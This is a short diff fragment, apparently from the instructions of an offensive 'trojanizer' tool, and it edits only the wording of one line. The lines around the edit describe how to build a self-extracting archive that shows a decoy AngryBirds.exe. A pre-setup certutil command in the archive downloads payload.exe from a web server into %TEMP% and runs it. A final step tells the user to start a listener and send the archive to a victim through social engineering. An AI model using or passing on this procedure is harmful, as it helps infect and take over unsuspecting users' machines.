@@ -111,7 +111,7 @@
 
     4º - running trojanizer tool
          PAYLOAD TO BE COMPRESSED => screenshot.png (it will not matter what you compress)
-         EXECUTE THIS FILE UPON EXTRACTION => AngryBirds.exe (to be executed as the decoy application)
+         EXECUTE THIS FILE UPON EXTRACTION => AngryBirds.exe (to be executed as decoy application)
          PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
 
     5º - start a listenner, and send the sfx archive to target using social enginnering
